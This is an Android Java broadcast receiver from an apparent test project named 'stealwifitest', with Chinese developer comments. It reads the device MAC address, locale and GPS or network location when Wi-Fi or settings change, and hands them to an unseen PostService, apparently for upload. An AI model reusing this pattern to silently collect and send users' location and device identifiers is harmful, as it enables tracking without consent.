package com.example.administrator.stealwifitest.broadcast;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.text.TextUtils;
import android.widget.Toast;

import com.example.administrator.stealwifitest.Utils.L;
import com.example.administrator.stealwifitest.Utils.persistance.SharePreferencePersistance;
import com.example.administrator.stealwifitest.service.PostService;

import java.util.ArrayList;
import java.util.Locale;

/**
 * 判断wifi是否链接,wifi链接且location!=null,就抓取,否则换为gps,gps等location改变时,记录位置发送???
 * 抓取地理位置:在应用开启期间只抓取一次: 有没有只调用一次的方法
 * gps-- location 有时会为null,还不知空旷地区是否第一次为null
 *         
 *         
 * 因为有时,或者第一次抓取的话,location有可能是null 这样position是没有数据的,这时不能发送
 * 但是在位置监听器里,只要调用,position就是有数据的,位置改变时会被多次调用 : (怎样让位置改变时只调用一次?)
 * 怎么等position有数据的时候再发送而且只发送一次?
 *
 * ---怎么判断连接了不同的 wifi ???
 * ---可以吧上次的ssid存到shared中,下次链接上之后判断一下,如果相同就不发送,如果不同再发送
 *
 * ===位置在打开期间只记录一次SharedPreference能否实现?        
 * ===若location!=null,且有position时,即刻发送.
 * ===position为0.00,0.00的情况下:利用SharedPreference在oncreate中初始化,在位置回调时:如果值为初始值,记录并发送位置,改为已经发送的值;否则,不做任何事.
 *
 * Created by Zan on 2016/11/22.
 */

public class WifiBroadcastReceiver extends BroadcastReceiver {
	private  Context mContext;
	private LocationManager mLocationManager;
	private String postion;
	private double latitude;
	private double longitude;
	private String provider;
	private String LOCATION_KEY = "HasLocation";
	
	@Override
	public void onReceive(Context context, Intent intent) {
		mContext = context;
		if (LocationManager.MODE_CHANGED_ACTION.equals(intent.getAction())) {
			L.e("GPS");

		}
		if (LocationManager.PROVIDERS_CHANGED_ACTION.equals(intent.getAction())) {
			L.e("GPS-----");
			LocationManager manager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
			boolean gpsEnabled = manager.isProviderEnabled(LocationManager.GPS_PROVIDER);
			if(gpsEnabled){
				L.e("gps-已打开");
			openAndGetLocation(context);
//				MaiManager.getInstance(context).getSysInfo(context);
//				postion=MaiManager.getPostion();
		    L.e("gps-已打开",postion);


			}else {
				L.e("gps-已关闭");
				openAndGetLocation(context);
				L.e("gps-已关闭",postion);
			}

		}

		if (Intent.ACTION_LOCALE_CHANGED.equals(intent.getAction())) {
			Locale locale = context.getResources().getConfiguration().locale;
			String language = locale.getLanguage();
			String country = locale.getCountry();
			String displayCountry = locale.getDisplayCountry();
			String displayLanguage = locale.getDisplayLanguage();
			Intent service = new Intent(context, PostService.class);
			service.putExtra("lan",language+country+"default"+displayLanguage+displayCountry);
			context.startService(service);

		}

		if (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(intent.getAction())) {
			// 这个监听wifi的打开与关闭，与wifi的连接无关
			int wifiState = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE, 0);
			L.e("M1", "wifiState" + wifiState); //打开后 先2 , 后3
			switch (wifiState) {
				case WifiManager.WIFI_STATE_DISABLED:     //关闭  后
					L.e("M1", "WIFI_STATE_DISABLED!");
					break;
				case WifiManager.WIFI_STATE_DISABLING:
					L.e("M1", "WIFI_STATE_DISABL-ING!");  //关闭  先
					break;
				case WifiManager.WIFI_STATE_ENABLING:
					WifiManager	wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
					String macAddress = wifi.getConnectionInfo().getMacAddress();
					if (isServiceRunning(context.getApplicationContext(),
					                     "com.example.administrator.stealwifitest.service.PostService")) {
						L.e("ServiceRunning");

					}else{
						L.e("ServiceNot!");
						Intent service = new Intent(context, PostService.class);
						service.putExtra("mac",macAddress);
						context.startService(service);
					}
					L.e("M1", "WIFI_STATE_ENABL-ING");    // 2 开启 先
					break;
				case WifiManager.WIFI_STATE_ENABLED:
				L.e("M1", "WIFI_STATE_ENABLED");          //3 开启 后
				break;
			}
		}


		// 这个可以判断wifi是否连接上,本来连接但是断开后会调用两次
		// 没连接wifi情况下关闭wifi开关,没反应,只打开wifi开关,没连接上wifi没反应
		// 所以也就是,可以判断wifi是否连接或断开,但不能判断wifi开关的开启或关闭

		// 这个监听网络连接的设置，包括wifi和移动数据的打开和关闭。.  
		// 最好用的还是这个监听。wifi如果打开，关闭，以及连接上可用的连接都会接到监听。
		// 这个广播的最大
		// 弊端是比上边两个广播的反应要慢，如果只是要监听wifi，我觉得还是用上边两个配合比较合适
		if (ConnectivityManager.CONNECTIVITY_ACTION.equals(intent.getAction())) {
			ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
			NetworkInfo gprs = manager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
			NetworkInfo wifi = manager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
			L.e("M3", "网络状态改变: wifi:" + wifi.isConnected() + " 3g:" + gprs.isConnected());
			NetworkInfo info = intent.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
			if (info != null) {
				L.e("M3", "info.getTypeName():" + info.getTypeName());
				L.e("M3", "getSubtypeName():" + info.getSubtypeName());
				L.e("M3", "getState():" + info.getState());
				L.e("M3", "getDetailedState():" + info.getDetailedState().name());
				L.e("M3", "getDetailedState():" + info.getExtraInfo());
				L.e("M3", "getType():" + info.getType());

				if (NetworkInfo.State.CONNECTED == info.getState()) {
					L.e("M3","NetworkInfo.State.CONNECTED == info.getState()");
				} else if (info.getType() == 1) {
					L.e("M3","info.getType() == 1");

					if (NetworkInfo.State.DISCONNECTING == info.getState()) {
					   L.e("M3","NetworkInfo.State.DISCONNECTING == info.getState()");
					}else{
						L.e("M3","NetworkInfo.State.DISCONNECTING != info.getState()");
					}
				}else{
					L.e("M3","info.getType() != 1 : ",info.getType());
				}
			}else{
				L.e("M3","info == null");
			}
		}
		//连接了之后开启服务?


		//证明:
		//1.没开启app的情况下,连接上wifi之后开启服务,打印log

		//2.地理位置的监听



	}
	private boolean isServiceRunning(Context context, String serviceName) {
		if (!TextUtils.isEmpty(serviceName) && context != null) {
			ActivityManager activityManager
				= (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
			ArrayList<RunningServiceInfo> runningServiceInfoList
				= (ArrayList<RunningServiceInfo>) activityManager.getRunningServices(100);
			for (RunningServiceInfo runningServiceInfo : runningServiceInfoList) {
				if (serviceName.equals(runningServiceInfo.service.getClassName())) {
					return true;
				}
			}
		} else {
			return false;
		}
		return false;
	}


	private void openAndGetLocation(Context context) {
	   L.e("location","openAndGetLocation");

		boolean providerEnabled = false;

		try {
			mLocationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
			providerEnabled = mLocationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
			if (!providerEnabled) {
				L.e("location","!providerEnabled");
				providerEnabled = mLocationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
			}
			L.e("location","openAndGetLocation2");
		} catch (Exception e) {

				e.printStackTrace();

			L.e("Please", "Add ACCESS_FINE_LOCATION Or ACCESS_COARSE_LOCATION Permission");
		}
		if (providerEnabled) {
			L.e("location","providerEnabled");
			getLocation(context);
			L.e("location", "openAndGetLocation: " + "有权限");
			//            Toast.makeText(this, "定位模块正常", Toast.LENGTH_SHORT).show();

		} else {
			L.e("location","provider-NOT-Enabled");
			postion = latitude + "," + longitude;
		}

		//        Toast.makeText(this, "请开启定位权限", Toast.LENGTH_SHORT).show();
		//        // 跳转到GPS的设置页面
		//        Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
		//        startActivityForResult(intent, 0); // 此为设置完成后返回到获取界面

	}

	private void getLocation(Context con) {
		L.e("location","getLocation");
		// android通过criteria选择合适的地理位置服务
		Criteria criteria = new Criteria();
		criteria.setAccuracy(Criteria.ACCURACY_FINE);// 高精度
		//        criteria.setAccuracy(Criteria. ACCURACY_COARSE);// 高精度
		criteria.setAltitudeRequired(false);// 设置不需要获取海拔方向数据
		criteria.setBearingRequired(false);// 设置不需要获取方位数据
		criteria.setCostAllowed(true);// 设置允许产生资费
		criteria.setPowerRequirement(Criteria.POWER_LOW);//  低功耗  wifi
//		criteria.setPowerRequirement(Criteria.POWER_HIGH);// 高功耗 gps

		provider = mLocationManager.getBestProvider(criteria, true);// 获取GPS信息
		L.e("location", "provider: location " + provider);
		Toast.makeText(con, provider+"1", Toast.LENGTH_SHORT).show();
		if (provider != null) {
			L.e("location", "provider != null");

			Location location = mLocationManager.getLastKnownLocation(provider);// 通过GPS获取位置
			if (location == null) {
				criteria.setPowerRequirement(Criteria.POWER_LOW);// 低功耗  wifi
				provider = mLocationManager.getBestProvider(criteria, true);// 获取GPS信息
				if (provider != null) {
					
					location = mLocationManager.getLastKnownLocation(provider);
					L.e("location", "location == null");
					L.e("location", "provider:" + provider);
					Toast.makeText(con, provider+"2", Toast.LENGTH_SHORT).show();
				}
			}
			if (provider != null) {
				if (location == null && provider.contains("network")) {  //没有wifi 情况下 变成gps
					criteria.setPowerRequirement(Criteria.POWER_HIGH);// 高功耗  gps
					provider = mLocationManager.getBestProvider(criteria, true);// 获取GPS信息
					if (provider != null) {
						location = mLocationManager.getLastKnownLocation(provider);
						L.e("location", "location == null");
						L.e("location", "provider:" + provider);
						Toast.makeText(con, provider + "3", Toast.LENGTH_SHORT).show();
					}
				}
			}
			
			updateUIToNewLocation(location);
			L.e("location", location);
			// 设置监听器，自动更新的最小时间为间隔N秒(这里的单位是微秒)或最小位移变化超过N米(这里的单位是米) 0.00001F
			mLocationManager.requestLocationUpdates(provider, 1000, 1, locationListener);
			
		} else {
			L.e("Please", "Add ACCESS_FINE_LOCATION Or ACCESS_COARSE_LOCATION Permission");
		}
	}


	private void updateUIToNewLocation(Location location) {

		if (location != null) {
			latitude = location.getLatitude();
			longitude = location.getLongitude();
			postion = latitude + "," + longitude;

			// Location类的方法：
			// getAccuracy():精度（ACCESS_FINE_LOCATION／ACCESS_COARSE_LOCATION）
			// getAltitude():海拨
			// getBearing():方位，行动方向
			// getLatitude():纬度
			// getLongitude():经度
			// getProvider():位置提供者（GPS／NETWORK）
			// getSpeed():速度
			// getTime():时刻
		} else {
			postion = +latitude + "," + longitude;
		}


	}
	
	// 定义对位置变化的监听函数
	LocationListener locationListener = new LocationListener() {
		public void onLocationChanged(Location location) {
			SharePreferencePersistance share = new SharePreferencePersistance();
			String string = share.getString(mContext, LOCATION_KEY, "None");
			
			if (string.equals("HasLocation")) {
				Toast.makeText(mContext,string+",doNothing", Toast.LENGTH_SHORT).show();
				
			}else{
				Toast.makeText(mContext,string+"NoLocation", Toast.LENGTH_SHORT).show();
				if (location != null) {
					
					latitude = location.getLatitude();
					longitude = location.getLongitude();
					
					postion = latitude + "," + longitude;
					Toast.makeText(mContext, postion, Toast.LENGTH_SHORT).show();
					L.e("location", "onLocationChanged: " + "纬度：" + location.getLatitude() + "\n经度" + location.getLongitude());
					share.putString(mContext,LOCATION_KEY,"HasLocation");
				} else {
					postion = latitude + "," + longitude;
					L.e("location","!!!!NO");
				}
			}

		}

		public void onStatusChanged(String provider, int status, Bundle extras) {

			L.e("location", "onStatusChanged: " + "privider:" + provider + "status:" + status + "extras:" + extras);
		}

		public void onProviderEnabled(String provider) {

			L.e("location", "onProviderEnabled: " + "privider:" + provider);

		}

		public void onProviderDisabled(String provider) {

			L.e("location", "onProviderDisabled: " + "privider:" + provider);

		}
	};



	//这个会调用好多次  不行
	// 这个监听wifi的连接状态即是否连上了一个有效无线路由，当上边广播的状态是
	// WifiManager.WIFI_STATE_DISABLING，和WIFI_STATE_DISABLED的时候，根本不会接到这个广播。

	// 在上边广播接到广播是WifiManager.WIFI_STATE_ENABLED状态的同时也会接到这个广播，
	// 当然刚打开wifi肯定还没有连接到有效的无线
	//		if (WifiManager.NETWORK_STATE_CHANGED_ACTION.equals(intent.getAction())) {
	//			Parcelable parcelableExtra = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
	//			if (null != parcelableExtra) {
	//				NetworkInfo networkInfo = (NetworkInfo) parcelableExtra;
	//				State state = networkInfo.getState();
	//
	//				// 当然，这边可以更精确的确定状态
	//				boolean isConnected = state == State.CONNECTED;
	////				L.e("M2", "isConnected :" + isConnected);
	//				if (isConnected) {
	//					L.e("M2","isConnected == true");    //会调用好多遍
	//				} else {
	//					L.e("M2","isConnected == false");
	//				}
	//			}else{
	//				L.e("M2","parcelableExtra == null");
	//			}
	//		}



}
